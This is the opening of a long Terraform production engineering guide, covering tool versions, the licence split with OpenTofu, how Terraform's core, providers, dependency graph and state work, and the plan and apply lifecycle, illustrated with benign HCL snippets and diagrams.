# Terraform Zero to Hero: A Production Engineering Guide

**For backend engineers who will design, write, review, operate and debug Terraform on real production systems.**

> Primary cloud: **AWS** (ECS on Fargate as the main compute example).
> Secondary coverage: **Kubernetes** (EKS and GKE, plus the Kubernetes and Helm providers) and **GCP** (Cloud Run, Cloud SQL, GCS backend, Workload Identity Federation).
> CI/CD throughout: **GitHub Actions**.
>
> Verified against tool and provider versions available on **23 September 2026**. See [Assumptions and verified versions](#assumptions-and-verified-versions) — read that section before copying anything.

---

## How to read this

This document is long because the subject is. It is a reference, not a tutorial you finish in an afternoon.

The thing that separates people who *write* Terraform from people who *own* Terraform is not syntax. It is understanding that Terraform is a **production infrastructure-change system**. Every apply is a change to a live system, mediated by a fragile JSON file that records what Terraform believes exists. Most of this guide is about that: state, blast radius, review, automation, and safety.

| Part | Covers | Read when |
|---|---|---|
| **I — Foundations** | What IaC solves, Terraform vs OpenTofu, how Terraform actually works, the plan/apply lifecycle | First. Chapters 3 and 4 are the ones that make everything later obvious |
| **II — Production Stack Types** | The kinds of Terraform stacks real organisations run, and their blast radius | Second. This shapes every structural decision you make later |
| **III — Core Language** | Every construct, in depth | Third, in order |
| **IV — State** | What state is, backends, locking, import, drift, disasters | Before you touch anything shared |
| **V — Modules and Repository Design** | Module design, environments, cross-stack dependencies | When you have more than one environment |
| **VI — Production Patterns** | AWS (VPC, IAM, ECS, RDS, ALB), Kubernetes (EKS/GKE), GCP equivalents | When you build the real thing |
| **VII — Security** | Threat model, secrets, supply chain, policy | Before production. Not after |
| **VIII — CI/CD with GitHub Actions** | The complete pipeline, with full YAML | When humans stop running apply from laptops |
| **IX — Testing** | fmt, validate, tflint, `terraform test`, Terratest, policy | When modules get reused |
| **X — Operations** | Reading plans, safe changes, refactoring, upgrades, cost, performance | Continuously |
| **XI — Organisation Scale** | Multi-account, platform teams, Terragrunt, Stacks, migrations | When you pass ~10 engineers or ~5 environments |
| **XII — Engineering Practice** | Distinctions, anti-patterns, PR review, scenarios, troubleshooting | Before every code review |
| **XIII — Learning and Reference** | Curriculum, 10 hands-on projects, cheat sheets, checklists, glossary | Throughout |

**If you need to ship something next week**, read chapters 3, 4, 8, 17, 18, 24, 27, then jump to [Chapter 79](#chapter-79--how-i-would-design-terraform-for-a-new-production-backend-from-a-blank-repository) and work backwards.

### Conventions

- ⚠️ marks something that will cause an incident in production.
- ⚠️ **INTENTIONALLY INSECURE/BAD EXAMPLE** marks code written deliberately wrong, always followed by the fix.
- 🧠 marks a mental model worth memorising.
- 💰 marks something that costs real money.
- 🔬 marks a version-specific feature, with the minimum version stated.
- **Recommendation:** marks my own opinion, as distinct from official behaviour or common practice.

Throughout, I try to be explicit about which of four things I am telling you:

| Label | Meaning |
|---|---|
| *Official behaviour* | Documented Terraform semantics. Verifiable in the docs |
| *Common practice* | What most teams actually do. Not always good |
| *Best practice* | What the weight of industry experience supports |
| **Recommendation** | What I would do, and why, for your situation specifically |

---

## Assumptions and verified versions

I checked these during research on 23 September 2026. Anything I could not verify is marked. **Re-check before copying**: this ecosystem moves fast, and a guide that looks authoritative but names a stale version is worse than no guide.

### Core tools

| Tool | Version | Notes |
|---|---|---|
| Terraform CLI | **1.16.4** (23 Sep 2026) | 1.16.0 GA 26 Aug 2026. 1.17 is beta — do not use in production |
| OpenTofu | **1.12.6** (19 Aug 2026) | 1.13.0-rc1 exists but is not GA |
| `hashicorp/aws` provider | **6.66.0** | 6.x GA since 18 Jun 2025 |
| `hashicorp/google` provider | **8.4.0** | 8.x is a major line |
| `hashicorp/kubernetes` provider | **3.2.1** | 3.x is a major line |
| `hashicorp/helm` provider | **3.3.0** | 3.x moved to the Plugin Framework |
| Terragrunt | **1.1.6** | Terragrunt has reached 1.x; older guides referencing 0.5x are outdated |

### Language feature availability

Each row states the **minimum version**. If your `required_version` is lower, the feature does not exist.

| Feature | Terraform | OpenTofu | Maturity |
|---|---|---|---|
| `moved` block | **1.1** | 1.6 | GA |
| `import` block | **1.5** | 1.6 | GA |
| `import` block with `for_each` | **1.7** | 1.8 | GA |
| `terraform plan -generate-config-out` | **1.5** | 1.6 | ⚠️ Still **experimental** as of 2026. Output needs hand-editing |
| `check` block | **1.5** | 1.6 | GA |
| `terraform test` / `.tftest.hcl` | **1.6** | 1.6 | GA |
| `terraform test` mocks and overrides | **1.7** | 1.7 | GA |
| `removed` block | **1.7** | 1.7 | GA |
| `removed` block with provisioners | **1.9** | — | GA |
| Provider-defined functions (`provider::aws::arn_parse`) | **1.8** | 1.7 | GA |
| `templatestring` function | **1.9** | 1.8 | GA |
| Ephemeral resources, variables and outputs | **1.10** | 1.11 | GA |
| Write-only arguments (`*_wo` + `*_wo_version`) | **1.11** | 1.11 | GA |
| S3 backend native locking (`use_lockfile`) | **1.10** experimental, **1.11** GA | 1.11 | GA. DynamoDB locking now deprecated |
| `import` blocks inside modules | **1.16** | — | GA |
| `lifecycle { destroy = false }` | **1.16** | 1.12 | GA |
| `terraform graph -format=mermaid` | **1.16** | — | GA |
| Terraform **Stacks** | GA | ❌ not in OpenTofu | ⚠️ **HCP Terraform / TFE 2.0+ only.** Not available in the open-source CLI |

### OpenTofu-only features

| Feature | Since | Notes |
|---|---|---|
| Client-side **state encryption** | 1.7 | The single biggest reason teams pick OpenTofu |
| `for_each` on **provider** blocks | 1.9 | Terraform has no equivalent |
| `enabled` inside `lifecycle` | 1.11 | Conditional resources without `count` |
| `prevent_destroy` referencing variables | 1.12 | Terraform requires a literal |
| `-json-into=FILE` | 1.12 | |
| Symbol Libraries, `-lint` | 1.13 (experimental) | Not GA |

### CI/CD and quality tooling

| Tool | Version | Notes |
|---|---|---|
| `hashicorp/setup-terraform` | **v4.0.1** | v4 runs on Node 24 |
| `opentofu/setup-opentofu` | **v2.0.2** | Verifies checksums by default |
| `aws-actions/configure-aws-credentials` | **v6.3.0** | Immutable releases |
| `google-github-actions/auth` | **v3.0.0** | |
| `infracost/actions` | **v4.x** | |
| Checkov | **3.3.19** | |
| Trivy | **0.74.0** | ⚠️ See the security note below |
| tflint | **0.64.0** | |
| Terratest | **v1.0.1** | 1.0 GA was 11 May 2026; now follows semver |
| Conftest (OPA) | **0.70.1** | |
| `terraform-aws-modules/vpc` | **6.7.3** | |
| `terraform-aws-modules/eks` | **21.26.0** | |
| `terraform-google-modules/kubernetes-engine` | **45.0.0** | |

### Two security facts that change how you write pipelines today

**1. Pin GitHub Actions by commit SHA.** In March 2026 attackers force-pushed malicious code to 76 of 77 tags in `aquasecurity/trivy-action` (CVE-2026-33634). A *security scanner* became a credential stealer because its tags were mutable. Use `trivy-action` ≥ 0.35.0, and pin every third-party action to a 40-character SHA.

**2. GitHub's OIDC subject format changed.** Repositories created, renamed or transferred **after 15 July 2026** use an "immutable" `sub` claim containing numeric owner and repo IDs — `repo:OWNER@ID/REPO@ID:...`. Trust policies written as `repo:my-org/my-repo:...` will silently fail to match on those repositories. Chapter 46 covers how to write a policy that works for both.

### What I could not fully verify

- The exact patch version where `-generate-config-out` graduated from experimental (it had not, as of mid-2026).
- Azure-specific details are included from general knowledge and are less thoroughly checked than the AWS and GCP material. Treat Azure snippets as directional.
- Several version facts came from release aggregators cross-checked against GitHub releases, not from a single authoritative changelog fetch.

### Assumptions about you and your systems

- Team of roughly 3–8 engineers; environments `dev`, `staging`, `production`.
- Backend services in Java/Spring Boot and Go, deployed as containers.
- You know Git and GitHub Actions well. I cross-reference Actions concepts rather than re-teaching them.
- You have, or can get, an AWS account with permission to create IAM roles. Several examples require that.
- Mistakes are expensive. I optimise for safety over cleverness throughout.

---
## Table of contents

**Part I — Foundations**

1. [The Problem Infrastructure as Code Solves](#chapter-1--the-problem-infrastructure-as-code-solves)
2. [Terraform, OpenTofu, and the Alternatives](#chapter-2--terraform-opentofu-and-the-alternatives)
3. [How Terraform Actually Works](#chapter-3--how-terraform-actually-works)
4. [The Plan and Apply Lifecycle](#chapter-4--the-plan-and-apply-lifecycle)
5. [Installation and Version Management](#chapter-5--installation-and-version-management)
6. [HCL: The Language](#chapter-6--hcl-the-language)
7. [Your First Real Configuration](#chapter-7--your-first-real-configuration)

**Part II — Production Stack Types**

8. [Types of Terraform Stacks Used in Production](#chapter-8--types-of-terraform-stacks-used-in-production)

**Part III — Core Language**

9. [Providers](#chapter-9--providers)
10. [Resources and Data Sources](#chapter-10--resources-and-data-sources)
11. [Variables, Outputs and Locals](#chapter-11--variables-outputs-and-locals)
12. [Expressions and Functions](#chapter-12--expressions-and-functions)
13. [`count` vs `for_each`, and Dynamic Blocks](#chapter-13--count-vs-for_each-and-dynamic-blocks)
14. [`lifecycle` and `depends_on`](#chapter-14--lifecycle-and-depends_on)
15. [Provisioners, and Why to Avoid Them](#chapter-15--provisioners-and-why-to-avoid-them)
16. [`moved`, `import`, `removed`, `check` and Custom Conditions](#chapter-16--moved-import-removed-check-and-custom-conditions)

**Part IV — State**

17. [What State Actually Is](#chapter-17--what-state-actually-is)
18. [Backends](#chapter-18--backends)
19. [Locking](#chapter-19--locking)
20. [State Commands](#chapter-20--state-commands)
21. [Import and Drift](#chapter-21--import-and-drift)
22. [Splitting and Merging State](#chapter-22--splitting-and-merging-state)
23. [State Disasters and Recovery](#chapter-23--state-disasters-and-recovery)

**Part V — Modules and Repository Design**

24. [Module Anatomy and Design](#chapter-24--module-anatomy-and-design)
25. [Module Versioning and Registries](#chapter-25--module-versioning-and-registries)
26. [Repository Layout: Monorepo vs Multi-Repo](#chapter-26--repository-layout-monorepo-vs-multi-repo)
27. [Environment Strategies](#chapter-27--environment-strategies)
28. [Cross-Stack Dependencies](#chapter-28--cross-stack-dependencies)
29. [Naming, Tagging and Labelling Standards](#chapter-29--naming-tagging-and-labelling-standards)

**Part VI — Production Infrastructure Patterns**

30. [AWS Networking: VPC, Subnets, NAT, Endpoints](#chapter-30--aws-networking-vpc-subnets-nat-endpoints)
31. [IAM and Least Privilege](#chapter-31--iam-and-least-privilege)
32. [ECS on Fargate](#chapter-32--ecs-on-fargate)
33. [The Data Layer: RDS, ElastiCache, SQS, S3](#chapter-33--the-data-layer-rds-elasticache-sqs-s3)
34. [The Edge: ALB, Route53, ACM](#chapter-34--the-edge-alb-route53-acm)
35. [Secrets and Configuration](#chapter-35--secrets-and-configuration)
36. [Observability Infrastructure](#chapter-36--observability-infrastructure)
37. [Kubernetes: Provisioning EKS and GKE](#chapter-37--kubernetes-provisioning-eks-and-gke)
38. [The Kubernetes and Helm Providers, and When Not to Use Them](#chapter-38--the-kubernetes-and-helm-providers-and-when-not-to-use-them)
39. [GCP Equivalents](#chapter-39--gcp-equivalents)

**Part VII — Security**

40. [A Threat Model for Terraform](#chapter-40--a-threat-model-for-terraform)
41. [Secrets and Sensitive Data](#chapter-41--secrets-and-sensitive-data)
42. [Provider and Module Supply Chain](#chapter-42--provider-and-module-supply-chain)
43. [Policy as Code and IaC Scanning](#chapter-43--policy-as-code-and-iac-scanning)
44. [Guardrails, Audit and Compliance](#chapter-44--guardrails-audit-and-compliance)

**Part VIII — CI/CD with GitHub Actions**

45. [Pipeline Architecture](#chapter-45--pipeline-architecture)
46. [OIDC: Keyless Authentication to AWS, GCP and Azure](#chapter-46--oidc-keyless-authentication-to-aws-gcp-and-azure)
47. [The PR Plan Workflow](#chapter-47--the-pr-plan-workflow)
48. [The Apply Workflow](#chapter-48--the-apply-workflow)
49. [Drift Detection](#chapter-49--drift-detection)
50. [Monorepo Path Filtering and the Multi-Stack Matrix](#chapter-50--monorepo-path-filtering-and-the-multi-stack-matrix)
51. [Module Release Automation](#chapter-51--module-release-automation)
52. [Self-Managed vs HCP Terraform vs Atlantis vs Spacelift](#chapter-52--self-managed-vs-hcp-terraform-vs-atlantis-vs-spacelift)

**Part IX — Testing and Quality**

53. [The Testing Pyramid for Infrastructure](#chapter-53--the-testing-pyramid-for-infrastructure)
54. [`terraform test`](#chapter-54--terraform-test)
55. [Terratest and Policy Tests](#chapter-55--terratest-and-policy-tests)
56. [Pre-commit, and What Not to Test](#chapter-56--pre-commit-and-what-not-to-test)

**Part X — Operations**

57. [Reading a Plan Like a Senior Engineer](#chapter-57--reading-a-plan-like-a-senior-engineer)
58. [Safe Production Changes](#chapter-58--safe-production-changes)
59. [Refactoring Without Destroying](#chapter-59--refactoring-without-destroying)
60. [Import Strategies](#chapter-60--import-strategies)
61. [Terraform and Provider Upgrades](#chapter-61--terraform-and-provider-upgrades)
62. [Drift Handling and Disaster Recovery](#chapter-62--drift-handling-and-disaster-recovery)
63. [Cost Management](#chapter-63--cost-management)
64. [Performance at Scale](#chapter-64--performance-at-scale)

**Part XI — Organisation Scale**

65. [Multi-Account and Multi-Project Architecture](#chapter-65--multi-account-and-multi-project-architecture)
66. [The Platform Team Model](#chapter-66--the-platform-team-model)
67. [Terragrunt](#chapter-67--terragrunt)
68. [Stacks and Orchestration](#chapter-68--stacks-and-orchestration)
69. [Migrations](#chapter-69--migrations)

**Part XII — Engineering Practice**

70. [Important Distinctions](#chapter-70--important-distinctions)
71. [Anti-Patterns](#chapter-71--anti-patterns)
72. [The Terraform PR Review Checklist](#chapter-72--the-terraform-pr-review-checklist)
73. [A Bad Configuration, Reviewed Line by Line](#chapter-73--a-bad-configuration-reviewed-line-by-line)
74. [Real-World Scenarios, With Solutions](#chapter-74--real-world-scenarios-with-solutions)
75. [A Troubleshooting Playbook](#chapter-75--a-troubleshooting-playbook)

**Part XIII — Learning and Reference**

76. [A Progressive Curriculum with Hands-On Projects](#chapter-76--a-progressive-curriculum-with-hands-on-projects)
77. [Cheat Sheets](#chapter-77--cheat-sheets)
78. [Production Checklists](#chapter-78--production-checklists)
79. [How I Would Design Terraform for a New Production Backend from a Blank Repository](#chapter-79--how-i-would-design-terraform-for-a-new-production-backend-from-a-blank-repository)

**Appendices**

- [Appendix A — Glossary](#appendix-a--glossary)
- [Appendix B — Further Reading](#appendix-b--further-reading)

---
# Part I — Foundations

---

## Chapter 1 — The Problem Infrastructure as Code Solves

### 1.1 What life looks like without it

A team runs a Spring Boot API on AWS. Someone set it up eighteen months ago by clicking through the console. Today:

- Nobody can say exactly what exists. There is an EC2 instance nobody recognises, three security groups with overlapping rules, and an RDS snapshot from a migration that half-finished.
- Staging and production have drifted. Staging has a parameter production lacks. Nobody knows which is correct.
- Reproducing the environment for a new region would take two weeks of archaeology.
- The person who built it left.
- A change to a security group was made at 2 a.m. during an incident. It is still there. No record of why.

This is not incompetence. It is the inevitable end state of manual infrastructure management, because **a console click leaves no artifact**. There is no diff, no review, no history, no test.

### 1.2 What "infrastructure as code" actually means

The phrase is used loosely. Precisely, it means: **the desired state of your infrastructure is expressed in files, those files are the only sanctioned way to change infrastructure, and a tool reconciles reality to match them.**

Four properties follow, and they are the entire value proposition:

| Property | What it gives you |
|---|---|
| **Declarative** | You describe the end state, not the steps. The tool computes the steps |
| **Versioned** | `git log` is your infrastructure change history. `git blame` tells you who and when |
| **Reviewable** | A change goes through a pull request before it touches production |
| **Reproducible** | The same configuration produces the same infrastructure, in a new region or a new account |

### 1.3 What Terraform specifically is

Not "an IaC tool". Concretely:

**Terraform reads declarative configuration written in HCL, builds a directed acyclic graph of the resources you declared and the dependencies between them, reads a recorded *state* file describing what it previously created, queries the real infrastructure through provider plugins that wrap cloud APIs, computes the difference between desired state and actual state, presents that difference as a *plan*, and — on your approval — walks the graph executing create, update and delete API calls to make reality match your configuration.**

Every word there matters, and the rest of Part I unpacks it.

```mermaid
flowchart LR
    A["Configuration<br/>what you WANT<br/>.tf files"] --> C["Terraform Core"]
    B["State<br/>what Terraform<br/>BELIEVES exists"] --> C
    D["Real infrastructure<br/>what ACTUALLY exists<br/>read via provider APIs"] --> C
    C --> E["Plan<br/>the difference"]
    E --> F["Apply<br/>API calls to close the gap"]
    F --> D
    F --> B
```

🧠 **The three-way comparison is the single most important idea in Terraform.** Almost every confusing behaviour — drift, unexpected replacement, "resource already exists", state corruption — is explained by one of these three being out of sync with the others. Keep this diagram in your head.

### 1.4 What Terraform is not

| Terraform is not | Use instead |
|---|---|
| A configuration management tool for what runs *inside* a server | Ansible, Chef, Puppet, or better, immutable container images |
| An application deployment tool | Your CD pipeline, ArgoCD, ECS/Kubernetes deployment primitives |
| A runtime orchestrator | Kubernetes, ECS, Nomad |
| A secrets manager | AWS Secrets Manager, GCP Secret Manager, Vault |
| A monitoring system | Terraform *provisions* CloudWatch alarms; it does not evaluate them |
| Imperative | It has no "run this, then that" model. Everything is a graph |

⚠️ The most common structural mistake beginners make is trying to use Terraform as a general-purpose scripting tool — `local-exec` provisioners running bash, `null_resource` chains, external data sources shelling out. This fights the model and produces configurations that are unpredictable and untestable. Chapter 15 covers why.

### 1.5 The cost side of the ledger

IaC is not free. Be honest about what you are taking on:

- **A new failure domain.** The state file can be lost or corrupted, and then you have a serious problem that manual infrastructure never had.
- **A learning curve** that is genuinely steep for the operational parts, not the syntax.
- **Slower small changes.** Changing one security group rule now means a PR, a review, a plan, an apply. This is the *point*, but it feels slow at first.
- **Version churn.** Providers release weekly. Major versions break things.
- **An additional system to secure.** Your Terraform pipeline holds credentials capable of destroying your entire infrastructure. It is now one of your highest-value attack targets (Chapter 40).

**Recommendation:** adopt Terraform for anything that will exist for more than a few weeks and that more than one person cares about. For a genuinely throwaway experiment, the console is fine — just destroy it afterwards.

---

## Chapter 2 — Terraform, OpenTofu, and the Alternatives

### 2.1 The licence split, and why you need to know about it

Terraform was open source (MPL 2.0) from 2014 until August 2023, when HashiCorp relicensed it under the **Business Source License (BUSL) 1.1**. BUSL is not an open-source licence: it restricts use in products that compete with HashiCorp's offerings. HashiCorp was subsequently acquired by IBM.

In response, the Linux Foundation forked the last MPL-licensed version as **OpenTofu**, now a CNCF project.

| | Terraform | OpenTofu |
|---|---|---|
| Licence | BUSL 1.1 | MPL 2.0 (true open source) |
| Governance | IBM / HashiCorp | Linux Foundation / CNCF, community RFC process |
| Current version | 1.16.4 | 1.12.6 |
| Config compatibility | — | Very high for existing configs; the language cores have started to diverge |
| State format | Compatible | Compatible |
| Providers | Same registry | Its own registry, mirrors the same providers |
| Unique features | Stacks (HCP-only), some newer language features first | **State encryption**, provider `for_each`, `lifecycle { enabled }`, variable-driven `prevent_destroy` |
| Managed platform | HCP Terraform / TFE | Scalr, Spacelift, env0, self-managed |
| Cost | Free CLI; HCP Terraform is paid at scale | Free, no commercial gate |

**Practical compatibility note:** for most configurations, switching is changing the binary. But the divergence is real and growing. If you use Terraform Stacks, you cannot move to OpenTofu. If you use OpenTofu state encryption or provider `for_each`, you cannot move back.

**Recommendation for your situation** (small team, backend services, no vendor relationship with IBM): either is defensible. I would pick **OpenTofu** if state encryption matters to you or if the licence matters to your employer, and **Terraform** if you want the largest body of documentation, tutorials and Stack Overflow answers to apply cleanly, or if you might adopt HCP Terraform later. The documentation gap still favours Terraform noticeably.

Everything in this guide works on both unless a version table says otherwise. I use `terraform` in commands; substitute `tofu` freely.

### 2.2 The broader alternatives

```mermaid
flowchart TD
    Q{"How do you want to<br/>describe infrastructure?"}
    Q -->|"Declarative DSL"| A["Terraform / OpenTofu<br/>HCL, huge provider ecosystem"]
    Q -->|"General-purpose language"| B["Pulumi — TS/Go/Python/C#<br/>AWS CDK — TS/Python, synthesises CloudFormation<br/>CDKTF — CDK syntax, Terraform engine"]
    Q -->|"Kubernetes-native CRDs"| C["Crossplane<br/>infrastructure as k8s objects,<br/>continuously reconciled"]
    Q -->|"Cloud-vendor native"| D["CloudFormation (AWS)<br/>Deployment Manager / Config Connector (GCP)<br/>ARM / Bicep (Azure)"]

    A --> A1["+ Largest ecosystem<br/>+ Cloud-agnostic<br/>+ Deep hiring pool<br/>− HCL is limited for real logic<br/>− State is your problem"]
    B --> B1["+ Real loops, types, tests, IDE support<br/>+ Reuse application language skills<br/>− Easy to write unreviewable code<br/>− Smaller community"]
    C --> C1["+ Continuous reconciliation, no drift<br/>+ Great if you already run k8s<br/>− Requires a cluster to manage cloud<br/>− Steep operational cost"]
    D --> D1["+ No state file to manage<br/>+ First-party support<br/>− Single cloud<br/>− Generally slower and clunkier"]
```

And the layer *around* Terraform:

| Tool | What it adds | When to consider |
|---|---|---|
| **Terragrunt** (1.1.6) | DRY backend config, dependency orchestration across stacks, `run-all` | Many similar stacks; backend boilerplate becomes painful |
| **Atlantis** | Self-hosted PR automation — `atlantis plan`/`apply` as PR comments | You want PR-driven workflow without SaaS |
| **HCP Terraform / TFE** | Managed state, runs, policy (Sentinel), private registry, Stacks | You want to stop operating the pipeline |
| **Spacelift / env0 / Scalr** | Managed runs with richer policy and drift detection | Mid-size org, want more than Atlantis, less lock-in than HCP |
| **Digger** | Runs Terraform inside your own GitHub Actions with orchestration | Want Atlantis-like UX on Actions runners |

**Recommendation for a 3–8 person team:** self-managed GitHub Actions (Part VIII). It costs nothing extra, keeps credentials inside infrastructure you already control, and everything you learn transfers. Revisit when you pass roughly 15 engineers or 20 stacks.

### 2.3 Terraform vs configuration management vs Kubernetes manifests

A distinction people get wrong constantly:

| | Terraform | Ansible | Kubernetes manifests / Helm |
|---|---|---|---|
| Manages | Cloud resources (VPCs, databases, clusters) | Software and config *inside* machines | Workloads *inside* a cluster |
| Model | Declarative, graph, state file | Imperative-ish playbooks, idempotent tasks | Declarative, continuously reconciled by controllers |
| Reconciliation | On demand, when you run apply | On demand | **Continuous** — the control loop never stops |
| Drift | Detected only when you plan | Detected only when you run | Corrected automatically |
| Right job | Create the EKS cluster and the RDS instance | Configure a legacy VM (increasingly rare) | Deploy the API pod, the service, the ingress |

🧠 The boundary: **Terraform creates the cluster; something else deploys into it.** Chapter 38 covers exactly where to draw that line and why blurring it causes pain.

---

## Chapter 3 — How Terraform Actually Works

This is the chapter that pays for itself repeatedly.

### 3.1 The components

```mermaid
flowchart TD
    subgraph CLI["Terraform CLI process"]
        CORE["Terraform Core<br/>— parses HCL<br/>— builds the resource graph<br/>— computes the diff<br/>— walks the graph<br/>— reads and writes state"]
    end

    subgraph PLUGINS["Provider plugins — separate OS processes"]
        P1["provider: aws<br/>terraform-provider-aws v6.66.0"]
        P2["provider: google<br/>v8.4.0"]
        P3["provider: kubernetes<br/>v3.2.1"]
        P4["provider: helm<br/>v3.3.0"]
    end

    subgraph BACKEND["Backend"]
        ST["State<br/>S3 + lockfile / GCS / HCP"]
    end

    subgraph CLOUD["Real world"]
        AWS["AWS APIs"]
        GCP["Google Cloud APIs"]
        K8S["Kubernetes API server"]
    end

    CORE <-->|"gRPC over local socket<br/>plugin protocol v5/v6"| P1
    CORE <-->|"gRPC"| P2
    CORE <-->|"gRPC"| P3
    CORE <-->|"gRPC"| P4
    CORE <-->|"read / lock / write"| ST
    P1 <-->|"HTTPS, SDK calls"| AWS
    P2 <-->|"HTTPS"| GCP
    P3 <-->|"HTTPS"| K8S
    P4 <-->|"HTTPS"| K8S
```

**Terraform Core** knows nothing about AWS. It understands HCL, graphs, diffs and state. That is all.

**Providers** are standalone binaries that Core launches as child processes and talks to over gRPC using the **plugin protocol**. A provider declares a schema (which resources exist, what arguments they take, which arguments force replacement) and implements four operations per resource type: create, read, update, delete. The read operation is what makes drift detection possible.

This separation is why Terraform can manage AWS, Cloudflare, Datadog, GitHub, PostgreSQL databases and your company's internal API with the same engine.

🔬 **Version note:** protocol v5 and v6 are both supported. v6 (Terraform 1.0+) added nested attribute types and is what modern providers use. You will rarely care, except when a very old provider fails with a protocol error.

### 3.2 What `terraform init` actually does

```mermaid
sequenceDiagram
    participant U as You
    participant C as Terraform Core
    participant R as Registry (registry.terraform.io)
    participant L as .terraform.lock.hcl
    participant B as Backend (S3)
    participant D as .terraform/ directory

    U->>C: terraform init
    C->>C: parse *.tf, find backend + required_providers + module blocks
    C->>B: initialise backend, test credentials and access
    B-->>C: ok — backend configured
    C->>D: write .terraform/terraform.tfstate (backend config, NOT your state)
    C->>C: download module sources (git, registry, local)
    C->>D: write .terraform/modules/
    C->>L: read existing lock file, if present
    alt lock file has an entry satisfying the constraint
        C->>D: install exactly that version + verify checksum
    else no entry, or constraint changed
        C->>R: query available versions matching the constraint
        R-->>C: version list
        C->>D: download the newest matching version
        C->>L: record version + h1: checksums for every platform seen
    end
    C-->>U: "Terraform has been initialized!"
```

Key things people misunderstand:

- **`.terraform/` is a cache, not state.** Safe to delete; `init` rebuilds it. Add it to `.gitignore`.
- **`.terraform/terraform.tfstate` is not your state.** It records *which backend* is configured. Confusingly named. Your real state lives in S3.
- **`.terraform.lock.hcl` IS committed to git.** It pins exact provider versions and checksums. Chapter 42 explains why this is a security control, not a convenience.
- `init` is safe and read-only with respect to your infrastructure. Run it freely.
- `init -upgrade` is what actually bumps providers within your constraints.

### 3.3 The dependency graph

Terraform builds a DAG from two sources:

**Implicit dependencies** — any time resource A's configuration references resource B's attribute:

```hcl
resource "aws_vpc" "main" {
  cidr_block = "10.0.0.0/16"
}

resource "aws_subnet" "private" {
  vpc_id     = aws_vpc.main.id   # ← implicit dependency on aws_vpc.main
  cidr_block = "10.0.1.0/24"
}
```

**Explicit dependencies** — `depends_on`, for ordering that Terraform cannot infer (Chapter 14).

```mermaid
flowchart TD
    VPC["aws_vpc.main"] --> IGW["aws_internet_gateway.main"]
    VPC --> SUBPUB["aws_subnet.public[0..2]"]
    VPC --> SUBPRIV["aws_subnet.private[0..2]"]
    VPC --> SGALB["aws_security_group.alb"]
    VPC --> SGSVC["aws_security_group.service"]
    IGW --> RTPUB["aws_route_table.public"]
    SUBPUB --> NAT["aws_nat_gateway.main"]
    EIP["aws_eip.nat"] --> NAT
    NAT --> RTPRIV["aws_route_table.private"]
    SUBPUB --> ALB["aws_lb.main"]
    SGALB --> ALB
    ALB --> TG["aws_lb_target_group.api"]
    TG --> LIS["aws_lb_listener.https"]
    ACM["aws_acm_certificate.main"] --> LIS
    SUBPRIV --> SVC["aws_ecs_service.api"]
    SGSVC --> SVC
    TG --> SVC
    TD["aws_ecs_task_definition.api"] --> SVC
```

Terraform walks this graph:
- **Creating/updating:** parents before children (VPC before subnet).
- **Destroying:** the graph is **reversed** — children before parents (subnet before VPC).
- **In parallel:** independent nodes run concurrently, default 10 at a time (`-parallelism=n`).

You can see the real graph:

```bash
terraform graph | dot -Tsvg > graph.svg        # requires graphviz
terraform graph -format=mermaid                 # 🔬 Terraform 1.16+
```

⚠️ **Cycle errors** happen when A depends on B and B depends on A. The usual causes are a security group pair referencing each other, or an IAM role and policy referencing each other's ARNs. Fix by splitting one side out — for security groups, use standalone `aws_vpc_security_group_ingress_rule` resources rather than inline `ingress` blocks.

### 3.4 Where state fits

```mermaid
flowchart LR
    subgraph T1["Run 1 — create"]
        C1["Config: 1 VPC"] --> P1["Plan: + 1 create"]
        P1 --> A1["Apply: CreateVpc API call"]
        A1 --> S1["State: records vpc-abc123<br/>and every attribute"]
    end
    subgraph T2["Run 2 — no change"]
        C2["Config: 1 VPC<br/>(unchanged)"] --> R2["Refresh: DescribeVpcs<br/>→ vpc-abc123 still matches"]
        S1 --> R2
        R2 --> P2["Plan: no changes"]
    end
    subgraph T3["Run 3 — someone deleted it in the console"]
        C3["Config: 1 VPC"] --> R3["Refresh: DescribeVpcs<br/>→ vpc-abc123 NOT FOUND"]
        S1 --> R3
        R3 --> P3["Plan: + 1 create<br/>(Terraform will recreate it)"]
    end
```

Without state, Terraform could not know that `aws_vpc.main` in your config corresponds to `vpc-abc123` in AWS. State is the **mapping from configuration addresses to real resource identities**, plus a cached copy of every attribute.

Part IV is devoted to this. For now, hold two facts:

1. 🧠 **State is the most dangerous file in your repository's orbit.** Lose it and Terraform forgets what it owns. Corrupt it and Terraform will do something catastrophic and confident.
2. ⚠️ **State contains secrets in plaintext.** RDS passwords, generated keys, anything a resource returns. Chapter 41 covers mitigations. Never put state in a git repository.

---

## Chapter 4 — The Plan and Apply Lifecycle

### 4.1 The full sequence

```mermaid
sequenceDiagram
    participant U as You
    participant C as Core
    participant B as Backend (S3)
    participant P as Provider (aws)
    participant A as AWS API

    Note over U,A: terraform plan
    U->>C: terraform plan -out=tfplan
    C->>B: acquire LOCK (write .tflock object)
    B-->>C: lock acquired
    C->>B: download current state
    B-->>C: state JSON
    C->>C: parse config, expand modules/count/for_each
    C->>C: build dependency graph
    loop REFRESH — for every resource in state
        C->>P: ReadResource(prior state)
        P->>A: Describe* / Get* API call
        A-->>P: current attributes (or 404)
        P-->>C: refreshed state (or "gone")
    end
    C->>C: DIFF: config (desired) vs refreshed (actual)
    C->>C: compute actions: create / update / replace / destroy / no-op
    C-->>U: render the plan
    C->>B: write plan file (if -out) and RELEASE lock
    Note over C: plan alone does not change infrastructure

    Note over U,A: terraform apply
    U->>C: terraform apply tfplan
    C->>B: acquire LOCK
    C->>B: re-read state, verify serial matches the plan's
    alt state changed since plan
        C-->>U: ERROR: saved plan is stale
    else state unchanged
        loop WALK THE GRAPH, up to -parallelism nodes at a time
            C->>P: ApplyResourceChange
            P->>A: Create / Update / Delete
            A-->>P: result + new attributes
            P-->>C: new resource state
            C->>B: write updated state (incrementally)
        end
    end
    C->>B: final state write, RELEASE lock
    C-->>U: "Apply complete! N added, M changed, K destroyed."
```

### 4.2 The commands, precisely

| Command | What it does | Changes infrastructure? | Changes state? |
|---|---|---|---|
| `terraform init` | Backend, providers, modules | No | No (writes `.terraform/` only) |
| `terraform fmt` | Rewrites files to canonical formatting | No | No |
| `terraform validate` | Syntax and internal consistency. **Does not contact the cloud** | No | No |
| `terraform plan` | Refresh + diff + render | No | **Yes, if refresh finds drift** (unless `-refresh=false`) |
| `terraform plan -out=f` | As above, saves a binary plan | No | Yes (refresh) |
| `terraform apply` | Plan, then prompt, then execute | **Yes** | **Yes** |
| `terraform apply f` | Executes a saved plan, no prompt | **Yes** | **Yes** |
